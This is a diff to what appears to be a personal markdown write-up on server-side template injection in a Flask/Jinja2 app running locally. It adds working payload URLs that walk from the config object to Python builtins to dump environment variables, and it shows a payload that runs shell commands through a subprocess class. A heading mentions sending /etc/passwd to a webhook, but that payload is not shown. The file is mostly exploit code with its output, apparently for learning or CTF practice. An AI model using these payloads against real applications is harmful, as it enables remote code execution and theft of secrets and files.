@@ -53,7 +53,16 @@ http://127.0.0.1:5000/?c={{%20(dict.mro()[-1]|attr(%22\x5f\x5fsubclasses\x5f\x5f
 
 
 - Get all the current envvars
+```http://127.0.0.1:5000/?c={{config}}```: ```<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None,```
+```http://127.0.0.1:5000/?c={{config.__class__}}``` : ```<class 'flask.config.Config'>```
+```http://127.0.0.1:5000/?c={{config.__class__.from_envvar}}```: ```<function Config.from_envvar at 0x7facac89bf60>```
+```http://127.0.0.1:5000/?c={{config.__class__.from_envvar[%22__globals__%22]}}```: ```{'__name__': 'flask.config', '__doc__': None, '__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7facac8a3190>, ...```
 
+PAYLOAD:
+```
+http://127.0.0.1:5000/?c={{config.__class__.from_envvar[%22__globals__%22][%22__builtins__%22][%22__import__%22](%22os%22).environ}}
+```
+![image](https://github.com/poorvi1910/Web/assets/146640913/de0b5534-d6a5-41aa-9c42-c4d4493f7a61)
 
 - Read a local file
 
@@ -80,12 +89,11 @@ http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data.__globals__.__bu
 
 ```http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568](%27cat%20try.py%27,%20shell=True,%20stdout=-1).communicate()}}``` :  running cat command on a python file to read it
 
-![image](https://github.com/poorvi1910/Web/assets/146640913/a516db8b-213f-4e58-8650-585cac3a95de)
-
 PAYLOAD:
 ```
 http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568](%27cat%20try.py%27,%20shell=True,%20stdout=-1).communicate()}}
 ```
+![image](https://github.com/poorvi1910/Web/assets/146640913/a516db8b-213f-4e58-8650-585cac3a95de)
 
 - Send the contents of etc pass to  awebhook
 
